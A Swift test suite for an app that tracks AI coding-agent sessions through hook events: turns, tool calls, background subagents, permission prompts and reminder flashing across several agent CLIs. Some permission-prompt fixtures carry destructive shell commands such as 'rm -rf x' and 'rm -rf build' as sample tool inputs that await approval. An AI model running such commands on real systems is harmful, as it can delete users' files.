        s = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "r", at: t0, kind: .promptSubmitted("新")), to: s)
        #expect(s.lastReply == nil && s.title == "T")
    }
}

@Suite struct TranscriptToolResults {
    @Test func collectsFinishedToolIds() {
        var t = TranscriptTally(format: .claude)
        let lines = [
            #"{"type":"assistant","message":{"id":"m1","content":[{"type":"tool_use","id":"toolu_a","name":"Bash"},{"type":"tool_use","id":"toolu_b","name":"Bash"}]}}"#,
            #"{"type":"user","message":{"content":[{"tool_use_id":"toolu_a","type":"tool_result","content":"Exit code 1","is_error":true}]}}"#,
            #"{"type":"user","message":{"content":[{"tool_use_id":"toolu_b","type":"tool_result","content":"ok"}]}}"#,
        ]
        t.consume(Data((lines.joined(separator: "\n") + "\n").utf8))
        #expect(t.finishedTools.map(\.id) == ["toolu_a", "toolu_b"])
        #expect(t.finishedTools.map(\.failed) == [true, false])
        #expect(t.usage.toolCalls == 2)
    }
}

@Suite struct SubagentLinks {
    private func file(_ text: String) throws -> URL {
        let u = FileManager.default.temporaryDirectory.appendingPathComponent("yaak-link-\(UUID().uuidString).jsonl")
        try text.write(to: u, atomically: true, encoding: .utf8)
        return u
    }

    @Test func readsPiParentFromHeader() throws {
        let u = try file(#"{"type":"session","version":3,"id":"c","cwd":"/x","parentSession":"/s/parent.jsonl"}"# + "\n" +
                         #"{"type":"model_change","id":"1"}"# + "\n")
        defer { try? FileManager.default.removeItem(at: u) }
        #expect(SubagentLink.parentSession(transcript: u) == "/s/parent.jsonl")
    }

    @Test func topLevelSessionHasNoParent() throws {
        let u = try file(#"{"type":"session","version":3,"id":"p","cwd":"/x"}"# + "\n")
        defer { try? FileManager.default.removeItem(at: u) }
        #expect(SubagentLink.parentSession(transcript: u) == nil)
        #expect(SubagentLink.parentSession(transcript: u.appendingPathExtension("missing")) == nil)
    }
}

@Suite struct Dismissal {
    let t0 = Date(timeIntervalSince1970: 1_000)
    private func ev(_ k: AgentEvent.Kind, _ dt: TimeInterval) -> AgentEvent {
        AgentEvent(agent: .claudeCode, sessionId: "d", at: t0.addingTimeInterval(dt), kind: k)
    }

    @Test func endedSessionStaysAwayUntilItNeedsTheUser() {
        var s = SessionReducer.apply(ev(.promptSubmitted("go"), 0), to: nil)
        s.dismissedAt = t0
        // The turn it was in carries on and finishes: still dismissed.
        s = SessionReducer.apply(ev(.toolStart(id: "1", name: "Bash", input: .null), 1), to: s)
        s = SessionReducer.apply(ev(.turnEnd(lastMessage: "ok"), 2), to: s)
        #expect(s.dismissedAt != nil)
        // It asks for input: back.
        s.dismissedAt = t0
        s = SessionReducer.apply(ev(.needsInput("?"), 3), to: s)
        #expect(s.dismissedAt == nil)
        // A new prompt: back.
        s.dismissedAt = t0
        s = SessionReducer.apply(ev(.promptSubmitted("again"), 4), to: s)
        #expect(s.dismissedAt == nil)
    }

    @Test func unhookedSnapshotsDoNotReviveIdleSession() {
        var s = SessionReducer.apply(ev(.statusSnapshot(.idle), 0), to: nil)
        s.dismissedAt = t0
        s = SessionReducer.apply(ev(.statusSnapshot(.idle), 5), to: s)
        #expect(s.dismissedAt != nil)
        s = SessionReducer.apply(ev(.statusSnapshot(.running), 6), to: s)
        #expect(s.dismissedAt == nil)
    }

    @Test func agentExitIsNotTheEndForTheUser() {
        var s = SessionReducer.apply(ev(.promptSubmitted("go"), 0), to: nil)
        s = SessionReducer.apply(ev(.turnEnd(lastMessage: "ok"), 1), to: s)
        s = SessionReducer.apply(ev(.sessionEnd, 2), to: s)
        #expect(s.status == .ended && s.display == .done)
    }

    @Test func sessionCountsAsStartedFromItsFirstMessage() {
        var s = SessionReducer.apply(ev(.sessionStart, 0), to: nil)
        #expect(s.isUnstarted)
        // Exiting without a message: still nothing to show.
        #expect(SessionReducer.apply(ev(.sessionEnd, 1), to: s).isUnstarted)
        s = SessionReducer.apply(ev(.promptSubmitted("go"), 1), to: s)
        #expect(!s.isUnstarted)
        s = SessionReducer.apply(ev(.sessionEnd, 2), to: s)
        #expect(!s.isUnstarted)
        // Sessions known only from session files are not judged by hooks.
        #expect(!SessionReducer.apply(ev(.statusSnapshot(.idle), 0), to: nil).isUnstarted)
    }

    @Test func endedFinishedSessionShowsEndedNotReviewed() {
        var s = SessionReducer.apply(ev(.promptSubmitted("go"), 0), to: nil)
        s = SessionReducer.apply(ev(.turnEnd(lastMessage: "ok"), 1), to: s)
        #expect(s.display == .review)
        s.dismissedAt = t0
        s.unreadSince = nil
        #expect(s.display == .ended)
        // A title arriving later does not bring it back.
        s = SessionReducer.apply(ev(.titleChanged("Named"), 2), to: s)
        #expect(s.dismissedAt != nil && s.display == .ended)
    }
}

@Suite struct AttentionTests {
    private func waiting() -> SessionState {
        fold([
            claude("UserPromptSubmit", ["prompt": .string("go")]),
            claude("Notification", ["message": .string("Claude needs your permission"),
                                    "notification_type": .string("permission_prompt")], at: 10),
        ])
    }

    @Test func flashesAfterThirtySecondsUnlessClicked() {
        let s = waiting()
        #expect(s.status == .needsInput)
        #expect(s.needsInputSince == t0.addingTimeInterval(10))
        #expect(!Attention.flashes(s, acknowledged: nil, now: t0.addingTimeInterval(39)))
        #expect(Attention.flashes(s, acknowledged: nil, now: t0.addingTimeInterval(41)))
        // Clicked after it started waiting: no flash. Clicked before: still flashes.
        #expect(!Attention.flashes(s, acknowledged: t0.addingTimeInterval(20), now: t0.addingTimeInterval(60)))
        #expect(Attention.flashes(s, acknowledged: t0.addingTimeInterval(5), now: t0.addingTimeInterval(60)))
    }

    @Test func unreviewedTurnFlashesAfterTenMinutesAtTheMac() {
        var s = fold([claude("UserPromptSubmit", ["prompt": .string("go")]), claude("Stop", at: 1)])
        #expect(s.display == .review)
        let end = s.lastEventAt
        func at(_ m: Double, back: Date? = .distantPast) -> Bool {
            Attention.reviewFlashes(s, presentSince: back, now: end.addingTimeInterval(m * 60))
        }
        #expect(!at(9))
        #expect(at(11))
        // Away now: no flash. Back 5 minutes ago: the clock starts again from then.
        #expect(!at(30, back: nil))
        #expect(!at(30, back: end.addingTimeInterval(25 * 60)))
        #expect(at(36, back: end.addingTimeInterval(25 * 60)))
        // Opened: reviewed, no flash.
        s.unreadSince = nil
        #expect(!at(30))
    }

    @Test func waitingSinceClearsWhenItMovesOn() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("next")], at: 50)], into: waiting())
        #expect(s.status == .running)
        #expect(s.needsInputSince == nil)
    }

    @Test func staleBlueRisesToTheMiddleThenFades() {
        var s = fold([claude("UserPromptSubmit", ["prompt": .string("go")]), claude("Stop", at: 1)])
        s.unreadSince = nil  // reviewed
        #expect(s.display == .done)
        let end = s.lastEventAt, linger: TimeInterval = 8 * 3600
        func at(_ m: Double) -> Double { Attention.staleness(s, linger: linger, now: end.addingTimeInterval(m * 60)) }
        #expect(at(5) == 0)
        #expect(at(10) == 0)
        #expect(at(60) > 0 && at(60) < at(120))
        #expect(abs(at(245) - 1) < 1e-9)  // (10 + 480) / 2 minutes
        #expect(at(400) < at(300))
        #expect(at(480) == 0)
        // Not yet reviewed: green "to review", not blue.
        s.unreadSince = end
        #expect(Attention.staleness(s, linger: linger, now: end.addingTimeInterval(245 * 60)) == 0)
    }

    @Test func thresholdsFollowTheSettings() {
        #expect(!Attention.flashes(waiting(), acknowledged: nil, now: t0.addingTimeInterval(50), after: 60))
        #expect(Attention.flashes(waiting(), acknowledged: nil, now: t0.addingTimeInterval(71), after: 60))
        var s = fold([claude("UserPromptSubmit", ["prompt": .string("go")]), claude("Stop", at: 1)])
        s.unreadSince = nil
        let end = s.lastEventAt
        func at(_ m: Double) -> Double { Attention.staleness(s, linger: 120 * 60, now: end.addingTimeInterval(m * 60), after: 30 * 60) }
        #expect(at(20) == 0)
        #expect(abs(at(75) - 1) < 1e-9)  // (30 + 120) / 2
        #expect(at(120) == 0)
        // Turning blue no earlier than the card leaves: never blue.
        #expect(Attention.staleness(s, linger: 30 * 60, now: end.addingTimeInterval(20 * 60), after: 30 * 60) == 0)
    }

    @Test func lookingAgainRestartsTheBlueClock() {
        var s = fold([claude("UserPromptSubmit", ["prompt": .string("go")]), claude("Stop", at: 1)])
        s.unreadSince = nil
        let end = s.lastEventAt, linger: TimeInterval = 8 * 3600
        #expect(Attention.staleness(s, linger: linger, now: end.addingTimeInterval(245 * 60)) > 0.99)
        // Opened again at the peak: back to plain, and the curve runs from then.
        s.reviewedAt = end.addingTimeInterval(245 * 60)
        #expect(s.quietSince == s.reviewedAt)
        #expect(Attention.staleness(s, linger: linger, now: end.addingTimeInterval(250 * 60)) == 0)
        #expect(abs(Attention.staleness(s, linger: linger, now: end.addingTimeInterval(490 * 60)) - 1) < 1e-9)
        // A look before the last event does not move it back.
        s.reviewedAt = end.addingTimeInterval(-60)
        #expect(s.quietSince == end)
    }
}

@Suite struct CodexBackground {
    private func codex(_ event: String, path: JSONValue?) -> HookEnvelope {
        var p: [String: JSONValue] = ["session_id": .string("01a15cf0-c3fc"), "hook_event_name": .string(event),
                                      "prompt": .string("app-generated request")]
        if let path { p["transcript_path"] = path }
        return HookEnvelope(agent: .codex, event: event, receivedAt: t0, payload: .object(p))
    }

    @Test func threadsWithoutRolloutAreIgnored() {
        #expect(Normalizer.normalize(codex("UserPromptSubmit", path: nil)).isEmpty)
        #expect(Normalizer.normalize(codex("SessionStart", path: .null)).isEmpty)
        #expect(Normalizer.normalize(codex("Stop", path: .string(""))).isEmpty)
        #expect(Normalizer.normalize(codex("UserPromptSubmit", path: .string("/r/rollout.jsonl"))).count == 1)
        // Claude Code is not affected.
        let claude = HookEnvelope(agent: .claudeCode, event: "UserPromptSubmit", receivedAt: t0,
                                  payload: .object(["session_id": .string("c"), "prompt": .string("hi")]))
        #expect(Normalizer.normalize(claude).count == 1)
    }
}

@Suite struct ClaudeBackgroundAgents {
    private func launch(_ id: String, at: TimeInterval) -> HookEnvelope {
        claude("PostToolUse", ["tool_name": .string("Agent"), "tool_use_id": .string("t-\(id)"),
                               "tool_response": .object(["isAsync": .bool(true), "agentId": .string(id)])], at: at)
    }

    private func notify(_ id: String, at: TimeInterval) -> HookEnvelope {
        claude("UserPromptSubmit", ["prompt": .string("<task-notification>\n<task-id>\(id)</task-id>\n<status>completed</status>\n</task-notification>")], at: at)
    }

    @Test func stopWaitsForTheLastBackgroundAgent() {
        let launched = fold([
            claude("UserPromptSubmit", ["prompt": .string("research both")]),
            launch("a1", at: 1),
            launch("a2", at: 2),
        ])
        #expect(launched.backgroundTasks == ["a1", "a2"])

        // The main agent says "waiting on them" and stops.
        let stopped = fold([claude("Stop", ["last_assistant_message": .string("Waiting.")], at: 3)], into: launched)
        #expect(stopped.status == .running)
        #expect(stopped.unreadSince == nil)
        #expect(stopped.turns.last?.endedAt == t0.addingTimeInterval(3))
        #expect(Alerts.between(launched, stopped) == nil)

        // The first one reports back; the main agent handles it and stops again.
        let first = fold([notify("a1", at: 10), claude("Stop", at: 12)], into: stopped)
        #expect(first.turns.count == 2)
        #expect(first.backgroundTasks == ["a2"])
        #expect(first.status == .running)
        #expect(Alerts.between(stopped, first) == nil)

        // The last one: now the turn is done.
        let beforeLast = fold([notify("a2", at: 20)], into: first)
        let done = fold([claude("Stop", ["last_assistant_message": .string("All in.")], at: 22)], into: beforeLast)
        #expect(done.backgroundTasks == nil)
        #expect(done.status == .idle)
        #expect(done.unreadSince == t0.addingTimeInterval(22))
        #expect(Alerts.between(beforeLast, done) == .done("All in."))
    }

    @Test func heldTurnIsNotFinishedByTheStuckCheck() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1), claude("Stop", at: 2)])
        let cfg = StuckConfig()
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(10), config: cfg, isAlive: { _ in true }) == nil)
        // A lost notification still surfaces, as silence.
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(400), config: cfg, isAlive: { _ in true })?.status == .stuck)
        // Forgetting it (setting turned off) lets the check finish the session.
        var forgot = s
        forgot.backgroundTasks = nil
        #expect(StuckDetector.evaluate(forgot, now: t0.addingTimeInterval(10), config: cfg, isAlive: { _ in true })?.status == .idle)
    }

    @Test func idleNoticeKeepsTheHeldTurnsEnd() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1), claude("Stop", at: 2),
                      claude("Notification", ["notification_type": .string("idle_prompt")], at: 62)])
        #expect(s.status == .running)
        #expect(s.turns.last?.endedAt == t0.addingTimeInterval(2))
    }

    @Test func onlyTheMainAgentsAsyncLaunchesCount() {
        let sync = claude("PostToolUse", ["tool_name": .string("Agent"), "tool_use_id": .string("t"),
                                          "tool_response": .object(["agentId": .string("a0"), "content": .string("ok")])])
        let nested = claude("PostToolUse", ["agent_id": .string("a1"), "tool_name": .string("Agent"), "tool_use_id": .string("t2"),
                                            "tool_response": .object(["isAsync": .bool(true), "agentId": .string("a3")])])
        #expect(fold([claude("UserPromptSubmit", ["prompt": .string("x")]), sync, nested]).backgroundTasks == nil)
    }

    @Test func sessionEndForgetsThem() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1), claude("SessionEnd", at: 2)])
        #expect(s.backgroundTasks == nil)
        #expect(s.status == .ended)
    }

    @Test func exitedProcessFinishesAHeldSession() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1), claude("Stop", at: 2)])
        let out = StuckDetector.evaluate(s, now: t0.addingTimeInterval(10), config: StuckConfig(), isAlive: { _ in false })
        #expect(out?.status == .idle)
    }

    @Test func silenceAppliesWithAStartedBackgroundAgent() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1),
                      claude("SubagentStart", ["agent_id": .string("a1")], at: 1), claude("Stop", at: 2)])
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(400), config: StuckConfig(), isAlive: { _ in true })?.status == .stuck)
    }

    @Test func stopKeepsABackgroundAgentsPermission() {
        let input: JSONValue = .object(["command": .string("rm -rf x")])
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1),
            claude("PreToolUse", ["agent_id": .string("a1"), "tool_name": .string("Bash"), "tool_use_id": .string("b1"),
                                  "tool_input": input], at: 2),
            claude("PermissionRequest", ["agent_id": .string("a1"), "tool_name": .string("Bash"), "tool_input": input,
                                         Normalizer.awaitingKey: .bool(true)], at: 3),
            claude("Stop", at: 4),
        ])
        #expect(s.status == .needsInput)
        #expect(s.pendingPermission?.awaitingDecision == true)
    }

    @Test func resumedAgentIsWaitedForAgain() {
        let resume = claude("PostToolUse", ["tool_name": .string("SendMessage"), "tool_use_id": .string("m"),
                                            "tool_response": .object(["success": .bool(true), "resumedAgentId": .string("a1")])], at: 30)
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), launch("a1", at: 1), notify("a1", at: 20), resume,
                      claude("Stop", at: 31)])
        #expect(s.backgroundTasks == ["a1"])
        #expect(s.status == .running)
    }

    @Test func notificationNamesEveryTask() {
        let p = "<task-notification>\n<task-id>a1</task-id>\n</task-notification>\n<task-notification>\n<task-id>b2</task-id>\n</task-notification>"
        #expect(Normalizer.notifiedTasks(p) == ["a1", "b2"])
        #expect(Normalizer.notifiedTasks("see <task-id>a1</task-id>").isEmpty)
    }
}

@Suite struct HermesFlow {
    private func hermes(_ event: String, _ extra: [String: JSONValue] = [:], tool: String? = nil,
                        input: JSONValue = .null, at: TimeInterval = 0) -> HookEnvelope {
        var p: [String: JSONValue] = ["hook_event_name": .string(event), "session_id": .string("h1"),
                                      "cwd": .string("/tmp/proj"), "tool_input": input, "extra": .object(extra)]
        p["tool_name"] = tool.map(JSONValue.string) ?? .null
        return HookEnvelope(agent: .hermes, event: event, receivedAt: t0.addingTimeInterval(at), payload: .object(p))
    }

    @Test func turnWithToolAndInterrupt() {
        let s = fold([
            hermes("pre_llm_call", ["user_message": .string("list files"), "is_first_turn": .bool(true)]),
            hermes("pre_tool_call", ["tool_call_id": .string("c1")], tool: "terminal",
                   input: .object(["command": .string("ls")]), at: 1),
            hermes("post_tool_call", ["tool_call_id": .string("c1"), "status": .string("ok"), "result": .string("a b")],
                   tool: "terminal", input: .object(["command": .string("ls")]), at: 2),
            hermes("post_llm_call", ["assistant_response": .string("Two files.")], at: 3),
            hermes("on_session_end", ["completed": .bool(true)], at: 4),
        ])
        #expect(s.title == "list files")
        #expect(s.latestTool?.isRunning == false)
        #expect(s.status == .idle)
        #expect(s.lastReply == "Two files.")
        #expect(s.resumeCommand == "hermes --resume 'h1'" || s.resumeCommand == "hermes --resume h1")

        let ended = fold([hermes("on_session_finalize", at: 5)], into: s)
        #expect(ended.status == .ended)
    }

    @Test func failedToolAndEmptySession() {
        let evs = Normalizer.normalize(hermes("post_tool_call", ["status": .string("error"), "error_message": .string("boom")],
                                              tool: "terminal", input: .object(["command": .string("x")])))
        guard case .toolEnd(_, _, let out, let isError) = evs.first?.kind else { Issue.record("no toolEnd"); return }
        #expect(isError && out == "boom")
        var e = hermes("pre_llm_call")
        if case .object(var o) = e.payload { o["session_id"] = .string(""); e.payload = .object(o) }
        #expect(Normalizer.normalize(e).isEmpty)
    }
}

/// Gemini CLI and Copilot CLI are renamed into the Claude schema.
@Suite struct RenamedSchemas {
    private func env(_ agent: AgentKind, _ event: String, _ p: [String: JSONValue], at: TimeInterval = 0) -> HookEnvelope {
        HookEnvelope(agent: agent, event: event, receivedAt: t0.addingTimeInterval(at), payload: .object(p))
    }
    private func gemini(_ event: String, _ fields: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
        var p: [String: JSONValue] = ["session_id": .string("g1"), "cwd": .string("/tmp/proj"), "hook_event_name": .string(event)]
        p.merge(fields) { $1 }
        return env(.gemini, event, p, at: at)
    }
    private func copilot(_ event: String, _ fields: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
        var p: [String: JSONValue] = ["sessionId": .string("c1"), "cwd": .string("/tmp/proj"), "timestamp": .number(1)]
        p.merge(fields) { $1 }
        return env(.copilot, event, p, at: at)
    }

    @Test func geminiTurn() {
        let input: JSONValue = .object(["command": .string("ls")])
        let s = fold([
            gemini("SessionStart", ["source": .string("startup")]),
            gemini("BeforeAgent", ["prompt": .string("list files")], at: 1),
            gemini("BeforeTool", ["tool_name": .string("run_shell_command"), "tool_input": input], at: 2),
            gemini("AfterTool", ["tool_name": .string("run_shell_command"), "tool_input": input,
                                 "tool_response": .object(["llmContent": .string("a b"), "returnDisplay": .string("a b")])], at: 3),
            gemini("AfterAgent", ["prompt": .string("list files"), "prompt_response": .string("Two files.")], at: 4),
        ])
        #expect(s.title == "list files")
        #expect(s.latestTool?.isRunning == false && s.latestTool?.output == "a b" && s.latestTool?.isError == false)
        #expect(s.status == .idle && s.lastReply == "Two files.")

        let failed = fold([
            gemini("BeforeTool", ["tool_name": .string("read_file"), "tool_input": input]),
            gemini("AfterTool", ["tool_name": .string("read_file"), "tool_input": input,
                                 "tool_response": .object(["llmContent": .object(["text": .string("x")]),
                                                           "error": .object(["message": .string("no such file")])])], at: 1),
        ])
        #expect(failed.latestTool?.isError == true && failed.latestTool?.isRunning == false)

        let asked = fold([gemini("Notification", ["notification_type": .string("ToolPermission"),
                                                  "message": .string("Allow run_shell_command?")], at: 5)], into: s)
        #expect(asked.status == .needsInput)
    }

    @Test func copilotTurnAndPermission() {
        let args: JSONValue = .string(#"{"command":"rm -rf build"}"#)
        let s = fold([
            copilot("sessionStart", ["source": .string("new")]),
            copilot("userPromptSubmitted", ["prompt": .string("clean up")], at: 1),
            copilot("preToolUse", ["toolName": .string("bash"), "toolArgs": args], at: 2),
            copilot("permissionRequest", ["toolName": .string("bash"), "toolArgs": args, Normalizer.awaitingKey: .bool(true)], at: 3),
        ])
        #expect(s.title == "clean up")
        #expect(s.status == .needsInput && s.pendingPermission?.awaitingDecision == true)
        #expect(s.needsInputMessage == "bash: rm -rf build")

        let done = fold([
            copilot("postToolUse", ["toolName": .string("bash"), "toolArgs": args,
                                    "toolResult": .object(["resultType": .string("success"), "textResultForLlm": .string("ok")])], at: 4),
            copilot("agentStop", ["transcriptPath": .string("/tmp/t.jsonl"), "stopReason": .string("end_turn")], at: 5),
        ], into: s)
        #expect(done.pendingPermission == nil)
        #expect(done.latestTool?.isRunning == false && done.latestTool?.output == "ok")
        #expect(done.status == .idle)

        let failed = fold([
            copilot("preToolUse", ["toolName": .string("bash"), "toolArgs": args]),
            copilot("postToolUse", ["toolName": .string("bash"), "toolArgs": args,
                                    "toolResult": .object(["resultType": .string("failure"), "textResultForLlm": .string("boom")])], at: 1),
        ])
        #expect(failed.latestTool?.isError == true && failed.latestTool?.output == "boom")
        #expect(Normalizer.normalize(copilot("sessionEnd", ["sessionId": .null])).isEmpty)
    }

    private func kimi(_ event: String, _ fields: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
        var p: [String: JSONValue] = ["session_id": .string("k1"), "cwd": .string("/tmp/proj"), "hook_event_name": .string(event)]
        p.merge(fields) { $1 }
        return env(.kimi, event, p, at: at)
    }

    @Test func kimiTurnAndPermission() {
        let input: JSONValue = .object(["command": .string("rm -rf build")])
        let tool: [String: JSONValue] = ["tool_name": .string("Shell"), "tool_input": input, "tool_call_id": .string("call_1")]
        let s = fold([
            kimi("SessionStart", ["source": .string("startup")]),
            kimi("UserPromptSubmit", ["prompt": .string("clean up")], at: 1),
            kimi("PreToolUse", tool, at: 2),
            // Notify-only: never shown as waiting on the app, even if a stray awaiting key arrives.
            kimi("PermissionRequest", tool.merging(["action": .string("run"), Normalizer.awaitingKey: .bool(true)]) { $1 }, at: 3),
        ])
        #expect(s.title == "clean up")
        #expect(s.status == .needsInput && s.pendingPermission?.id == "call_1" && s.pendingPermission?.awaitingDecision == false)

        let answered = fold([kimi("PermissionResult", ["tool_call_id": .string("call_1"), "decision": .string("approved")], at: 4)], into: s)
        #expect(answered.status == .running && answered.pendingPermission == nil)

        let done = fold([
            kimi("PostToolUse", tool.merging(["tool_output": .string("removed")]) { $1 }, at: 5),
            kimi("Stop", ["stop_hook_active": .bool(false)], at: 6),
        ], into: answered)
        #expect(done.latestTool?.isRunning == false && done.latestTool?.output == "removed")
        #expect(done.status == .idle)

        let failed = fold([
            kimi("PreToolUse", tool),
            kimi("PostToolUseFailure", tool.merging(["error": .object(["message": .string("denied")])]) { $1 }, at: 1),
            kimi("Interrupt", at: 2),
        ])
        #expect(failed.latestTool?.isError == true && failed.latestTool?.output == "denied")
        #expect(failed.status == .idle)
    }

    @Test func kimiPromptPartsAndSubagent() {
        let parts: JSONValue = .array([.object(["type": .string("text"), "text": .string("fix")]),
                                       .object(["type": .string("image_url"), "image_url": .string("x")]),
                                       .object(["type": .string("text"), "text": .string("the build")])])
        let agent: [String: JSONValue] = ["tool_name": .string("Agent"), "tool_input": .object([:]), "tool_call_id": .string("a1")]
        let sub: [String: JSONValue] = ["tool_name": .string("Shell"), "tool_input": .object([:]), "tool_call_id": .string("s1")]
        let s = fold([
            kimi("UserPromptSubmit", ["prompt": parts]),
            kimi("PreToolUse", agent, at: 1),
            kimi("SubagentStart", ["agent_name": .string("coder")], at: 2),
            kimi("PreToolUse", sub, at: 3),
            kimi("PostToolUse", sub, at: 4),
            // The sub-agent's own Stop: the parent turn goes on.
            kimi("Stop", at: 5),
        ])
        #expect(s.title == "fix the build")
        #expect(s.status == .running && s.subagents.map(\.id) == ["coder"])

        let done = fold([
            kimi("SubagentStop", ["agent_name": .string("coder")], at: 6),
            kimi("PostToolUse", agent, at: 7),
            kimi("Stop", at: 8),
        ], into: s)
        #expect(done.subagents.isEmpty && done.status == .idle)
    }

    @Test func zcodeAndKiro() {
        let tmp = "/var/folders/x/zcode-hook-123.jsonl"
        let z = Normalizer.normalize(env(.zcode, "Stop", ["session_id": .string("z1"), "hook_event_name": .string("Stop"),
                                                         "transcript_path": .string(tmp), "last_assistant_message": .string("Done.")]))
        #expect(z.count == 1 && z[0].transcriptPath == nil)
        #expect(z.first?.kind == .turnEnd(lastMessage: "Done."))

        // Kiro sends no tool id: start and end pair through the synthetic one.
        let input: JSONValue = .object(["path": .string("README.md")])
        func kiro(_ event: String, _ f: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
            env(.kiro, event, ["session_id": .string("r1"), "hook_event_name": .string(event)].merging(f) { $1 }, at: at)
        }
        let s = fold([
            kiro("UserPromptSubmit", ["prompt": .string("read it")]),
            kiro("PreToolUse", ["tool_name": .string("read"), "tool_input": input], at: 1),
            kiro("PostToolUse", ["tool_name": .string("read"), "tool_input": input, "tool_response": .string("hi")], at: 2),
            kiro("Stop", at: 3),
        ])
        #expect(s.tools.count == 1 && s.latestTool?.isRunning == false && s.latestTool?.output == "hi")
        #expect(s.status == .idle)
    }
}
